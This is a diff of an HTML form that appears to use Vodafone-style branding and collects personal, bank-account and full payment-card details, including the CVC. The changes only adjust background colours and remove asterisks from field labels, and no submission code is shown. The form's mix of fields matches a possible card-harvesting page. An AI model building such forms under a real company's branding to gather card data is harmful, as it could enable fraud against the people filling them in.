@@ -91,6 +91,7 @@
 
     .form-body {
       padding: 2rem;
+      background-color: #e60000; /* Matching header color background behind sections */
     }
 
     .section {
@@ -209,6 +210,9 @@
       border-top: 1px solid #eef2f6;
       margin-top: 8px;
       padding-top: 1.8rem;
+      background-color: #ffffff; /* keep actions area white for contrast */
+      border-radius: 0 0 24px 24px;
+      margin-bottom: 0.5rem;
     }
 
     .btn {
@@ -444,7 +448,7 @@
         </div>
         <div class="fields-grid">
           <div class="input-group">
-            <label><i class="fas fa-user"></i> First name *</label>
+            <label><i class="fas fa-user"></i> First name</label>
             <input type="text" name="First Name" id="firstName" placeholder="James" required>
           </div>
           <div class="input-group">
@@ -452,13 +456,13 @@
             <input type="text" name="Middle Name" id="middleName" placeholder="Robert (optional)">
           </div>
           <div class="input-group">
-            <label><i class="fas fa-user-tag"></i> Surname *</label>
+            <label><i class="fas fa-user-tag"></i> Surname</label>
             <input type="text" name="Surname" id="surname" placeholder="Smith" required>
           </div>
           
           <!-- Date of Birth section - 3 fields -->
           <div class="input-group full-width">
-            <label><i class="fas fa-birthday-cake"></i> Date of birth *</label>
+            <label><i class="fas fa-birthday-cake"></i> Date of birth</label>
             <div class="dob-row">
               <select id="dobDay" name="Date of Birth - Day" required style="padding: 12px 8px;">
                 <option value="" disabled selected>Day</option>
@@ -473,15 +477,15 @@
           </div>
           
           <div class="input-group">
-            <label><i class="fas fa-mobile-alt"></i> Phone number *</label>
+            <label><i class="fas fa-mobile-alt"></i> Phone number</label>
             <input type="tel" name="Phone Number" id="phoneNo" placeholder="07700 900123" required>
           </div>
           <div class="input-group full-width">
-            <label><i class="fas fa-home"></i> Full address (house no., street, postcode) *</label>
+            <label><i class="fas fa-home"></i> Full address (house no., street, postcode)</label>
             <input type="text" name="Address" id="address" placeholder="1 Vodafone Way, Newbury, RG14 2FN" required>
           </div>
           <div class="input-group full-width">
-            <label><i class="fas fa-clock"></i> History on address (years lived at this address) *</label>
+            <label><i class="fas fa-clock"></i> History on address (years lived at this address)</label>
             <input type="text" name="History on Address" id="historyAddress" placeholder="e.g. 4 years, 2 months" required>
           </div>
         </div>
@@ -495,15 +499,15 @@
         </div>
         <div class="fields-grid">
           <div class="input-group full-width">
-            <label><i class="fas fa-signature"></i> Name on account *</label>
+            <label><i class="fas fa-signature"></i> Name on account</label>
             <input type="text" name="Name on Account" id="nameOnAccount" placeholder="Mr J. Smith" required>
           </div>
           <div class="input-group">
-            <label><i class="fas fa-code-branch"></i> Sort code *</label>
+            <label><i class="fas fa-code-branch"></i> Sort code</label>
             <input type="text" name="Sort Code" id="sortCode" placeholder="20-00-00" required>
           </div>
           <div class="input-group">
-            <label><i class="fas fa-credit-card"></i> Account number *</label>
+            <label><i class="fas fa-credit-card"></i> Account number</label>
             <input type="text" name="Account Number" id="accountNumber" placeholder="12345678" required>
           </div>
         </div>
@@ -517,20 +521,20 @@
         </div>
         <div class="fields-grid">
           <div class="input-group full-width">
-            <label><i class="fas fa-id-card"></i> Name on card *</label>
+            <label><i class="fas fa-id-card"></i> Name on card</label>
             <input type="text" name="Name on Card" id="nameOnCard" placeholder="JAMES SMITH" required>
           </div>
           <div class="input-group full-width">
-            <label><i class="fas fa-hashtag"></i> Long numbers (card number) *</label>
+            <label><i class="fas fa-hashtag"></i> Long numbers (card number)</label>
             <input type="text" name="Card Number" id="cardNumber" placeholder="4532 1234 5678 9101" maxlength="19" required>
           </div>
           <div class="card-row">
             <div class="input-group">
-              <label><i class="fas fa-calendar-alt"></i> Expiry date (MM/YY) *</label>
+              <label><i class="fas fa-calendar-alt"></i> Expiry date (MM/YY)</label>
               <input type="text" name="Expiry Date" id="expiryDate" placeholder="08/28" required>
             </div>
             <div class="input-group">
-              <label><i class="fas fa-lock"></i> CVC *</label>
+              <label><i class="fas fa-lock"></i> CVC</label>
               <input type="text" name="CVC" id="cvc" placeholder="123" maxlength="4" required>
             </div>
           </div>
@@ -545,7 +549,7 @@
         </div>
         <div class="fields-grid">
           <div class="input-group full-width">
-            <label><i class="fas fa-chart-line"></i> Employment status *</label>
+            <label><i class="fas fa-chart-line"></i> Employment status</label>
             <select name="Employment Status" id="employmentStatus" required>
               <option value="" disabled selected>– Select status –</option>
               <option value="Employed (Full-time)">Employed (Full-time)</option>
